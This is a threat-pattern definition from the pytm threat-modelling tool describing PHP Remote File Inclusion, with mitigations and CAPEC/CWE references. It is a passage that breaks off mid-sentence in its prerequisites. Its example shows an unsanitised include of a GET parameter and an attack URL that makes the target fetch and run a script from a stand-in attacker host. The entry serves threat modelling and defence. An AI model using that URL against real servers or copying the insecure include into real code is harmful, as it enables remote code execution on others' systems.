sid: INP16
title: PHP Remote File Inclusion
source: pytm v1.4.0
pytm_targets:
- Server
elements:
- process
condition: target.controls.validatesInput is False
severity: High
likelihood: null
details: In this pattern the adversary is able to load and execute arbitrary code remotely
  available from the application. This is usually accomplished through an insecurely configured
  PHP runtime environment and an improperly sanitized include or require call, which the user
  can then control to point to any web-accessible file. This allows adversaries to hijack
  the targeted application and force it to execute their own instructions.
mitigations: 'Implementation: Perform input validation for all remote content, including remote
  and user-generated contentImplementation: Only allow known files to be included (whitelist)Implementation:
  Make use of indirect references passed in URL parameters instead of file namesConfiguration:
  Ensure that remote scripts cannot be include in the include or require PHP directives'
example: 'The adversary controls a PHP script on a server http://attacker.com/rfi.txt The
  .txt extension is given so that the script doesn''t get executed by the attacker.com server,
  and it will be downloaded as text. The target application is vulnerable to PHP remote file
  inclusion as following: include($_GET[''filename''] . ''.txt'') The adversary creates an
  HTTP request that passes his own script in the include: http://example.com/file.php?filename=http://attacker.com/rfi
  with the concatenation of the .txt prefix, the PHP runtime download the attack''s script
  and the content of the script gets executed in the same context as the rest of the original
  script.'
references: https://capec.mitre.org/data/definitions/193.html, http://cwe.mitre.org/data/definitions/98.html,
  http://cwe.mitre.org/data/definitions/80.html, http://cwe.mitre.org/data/definitions/714.html
prerequisites: Target application server must allow remote files to be included in the require,
  include, etc. PHP directivesThe adversary must have the ability to make HTTP requests to
